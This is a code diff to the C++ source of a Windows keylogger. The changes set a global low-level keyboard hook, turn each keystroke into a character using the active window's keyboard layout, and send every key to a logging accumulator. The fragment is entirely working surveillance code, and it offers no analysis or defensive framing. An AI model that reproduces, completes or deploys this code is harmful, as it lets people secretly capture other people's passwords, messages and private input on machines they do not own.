@@ -5,6 +5,8 @@
 
 #define BUF_SIZE 100
 
+KeyLogger* KeyLogger::instance;
+
 KeyLogger::KeyLogger()
 {
 	mHookReleased = true;
@@ -20,6 +22,7 @@ KeyLogger::~KeyLogger()
 
 void KeyLogger::Init()
 {
+	instance = this;
 	InstallHook();
 	mHookReleased = false;
 }
@@ -47,7 +50,8 @@ void KeyLogger::InstallHook(void)
 
     // Set a global Windows Hook to capture keystrokes. Callback to static wrapper for non-static function
     mHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::LowLevelKeyboardProc, appInstance, 0 );
-	
+
+	// This will 'hang' the thread running (and listening for keystrokes)
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) > 0)
     {
@@ -69,21 +73,19 @@ LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPAR
 		{
 			wchar_t key[KEYNAME_LENGTH] = {0}; // unicode!
 
-			if (pKeyBoard->flags & LLKHF_EXTENDED) // is it extended char?
-			{
-				DWORD dwMsg = 1;
-				dwMsg += pKeyBoard->scanCode << 16;
-				dwMsg += pKeyBoard->flags << 24;
+			DWORD dwMsg = pKeyBoard->scanCode << 16;//0;
 
-				// This block place key name into key wide string in a braces: [shift]
-				key[0] = L'[';
-				int act_length = GetKeyNameTextW(dwMsg, key+1, KEYNAME_LENGTH-1);
-				key[act_length + 1] = L']';
-			}
-			else // letter, digit...
+			// This block place key name into key wide string in a braces: [shift]
+			key[0] = L'[';
+			int act_length = GetKeyNameTextW(dwMsg, key+1, KEYNAME_LENGTH-1);
+			WORD error = GetLastError();
+			key[act_length + 1] = L']';
+
+			if (act_length == 1) // i.e. letter/digit or signs: !@#$%^&*()_+-=
 			{
 				// This block retrieves keyboard layout of active window 
 				GUITHREADINFO guiThreadInfo;
+				guiThreadInfo.cbSize = sizeof(GUITHREADINFO);
 				GetGUIThreadInfo(0, &guiThreadInfo);
 				DWORD dwThreadID = GetWindowThreadProcessId(guiThreadInfo.hwndActive, NULL);
 				HKL layout = GetKeyboardLayout(dwThreadID);
@@ -91,11 +93,20 @@ LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPAR
 				// Translate to actual character depending on keyboard state and layout
 				BYTE keyState[256];
 				GetKeyboardState(keyState);
+				key[0]=key[1]=key[2]=0; // reset key. Note that act_length=1 "[A]"
 				ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keyState, key, 1, pKeyBoard->flags, layout);
 			}
+
+			// Log da key:
+			instance->GetDataAccumulator()->LogKey(key);
+			
+			return HC_ACTION;
 		}
 	}
 
 	HHOOK hhook = NULL;
-	return CallNextHookEx(hhook, nCode, wParam, lParam);
+	LRESULT result = CallNextHookEx(hhook, nCode, wParam, lParam);
+	WORD error = GetLastError();
+	if (error != ERROR_SUCCESS) return HC_ACTION;
+	return result;
 }
